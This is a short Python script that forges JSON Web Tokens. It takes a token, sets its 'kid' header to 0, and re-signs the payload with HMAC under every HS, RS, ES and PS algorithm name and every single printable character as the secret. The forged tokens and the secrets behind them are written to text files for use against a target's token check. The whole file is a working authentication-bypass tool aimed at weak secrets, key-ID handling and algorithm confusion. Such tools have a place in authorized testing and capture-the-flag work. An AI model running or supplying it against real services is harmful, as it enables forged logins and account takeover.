import base64
import hmac
import json
import os
import sys


def jwt_b64_encode(data):
    return base64.urlsafe_b64encode(data).decode('utf8').replace('=', '')


def jwt_b64_decode(data):
    data_len_mod = len(data) % 4
    if data_len_mod > 0:
        data += (4 - data_len_mod) * '='
    return base64.urlsafe_b64decode(data)


def jwt_chunk_encode(data):
    return jwt_b64_encode(json.dumps(data).encode('utf8'))


def jwt_chunk_decode(data):
    return json.loads(jwt_b64_decode(data).decode('utf8'))


def jwt_hmac(secret, data, digest_name):
    return hmac.new(secret.encode('utf8'), data.encode('utf8'), digest_name).digest()


def jwt_encode(header, payload, secret):
    token = '{}.{}'.format(jwt_chunk_encode(header), jwt_chunk_encode(payload))
    alg = header['alg']
    hmac_bits = alg[2:]
    signature = jwt_hmac(secret, token, 'sha{}'.format(hmac_bits))
    token = '{}.{}'.format(token, jwt_b64_encode(signature))
    return token


def jwt_decode(token):
    token_chunks = token.split('.')
    if len(token_chunks) != 3:
        raise Exception('Invalid JWT token')
    return map(jwt_chunk_decode, token_chunks[:2])


def main():
    if len(sys.argv) != 2:
        print('usage: python3 {} jwt-token'.format(sys.argv[0]))
        sys.exit(1)
    tokens = []
    header, payload = jwt_decode(sys.argv[1].strip())
    header['kid'] = 0
    for alg in ['HS', 'RS', 'ES', 'PS']:
        for alg_bits in ['256', '384', '512']:
            header['alg'] = '{}{}'.format(alg, alg_bits)
            for secret in range(32, 127):
                secret = chr(secret)
                tokens.append((
                    jwt_encode(header, payload, secret),
                    header['alg'],
                    secret
                ))
    with open('tokens.txt', 'w') as tokens_f, open('tokens_meta.txt', 'w') as tokens_meta_f:
        for token in tokens:
            tokens_f.write('{}{}'.format(token[0], os.linesep))
            tokens_meta_f.write('{}:{}:{}{}'.format(token[0], token[1], token[2], os.linesep))


if __name__ == '__main__':
    main()
